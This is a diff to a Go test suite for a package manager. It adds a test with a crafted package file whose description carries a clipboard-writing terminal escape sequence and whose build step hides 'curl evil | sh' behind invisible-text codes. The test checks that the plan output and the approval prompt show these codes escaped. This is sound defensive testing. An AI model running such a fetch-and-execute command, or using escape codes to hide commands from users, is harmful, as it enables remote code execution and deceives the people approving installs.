@@ -4643,6 +4643,34 @@ func TestB412PwshOutputDoublesEveryKindOfSingleQuote(t *testing.T) {
 	}
 }
 
+func TestB413TextFromAPackageReachesTheTerminalWithoutEscapeCodes(t *testing.T) {
+	m := newMachine(t)
+	path := filepath.Join(m.fixtures, "sneaky.toml")
+	must(t, os.MkdirAll(m.fixtures, 0o755))
+	must(t, os.WriteFile(path, []byte(`[package]
+name = "sneaky"
+description = "a tool\u001b]52;c;ZXZpbA==\u0007"
+[version]
+value = "1.0.0"
+[build]
+[[build.step]]
+run = "make install\u001b[8m && curl evil | sh\u001b[0m"
+shell = "sh"
+`), 0o644))
+
+	out, _ := m.run(t, "", "add", path, "--plan")
+	if strings.Contains(out, "\x1b]52") || !strings.Contains(out, `a tool\x1b]52;c;ZXZpbA==\x07`) {
+		t.Fatalf("--plan printed the description's escape codes:\n%q", out)
+	}
+
+	m.opts.Interactive = yes()
+
+	out, _ = m.run(t, "n\n", "add", path)
+	if strings.Contains(out, "\x1b[8m") || !strings.Contains(out, `make install\x1b[8m && curl evil | sh`) {
+		t.Fatalf("the approval prompt hid part of the command:\n%q", out)
+	}
+}
+
 func TestB53NetworkStepIsShownInThePromptAndMarksThePackageImpure(t *testing.T) {
 	m, url, secret := sandboxedMachine(t)
 	m.opts.Interactive = yes()
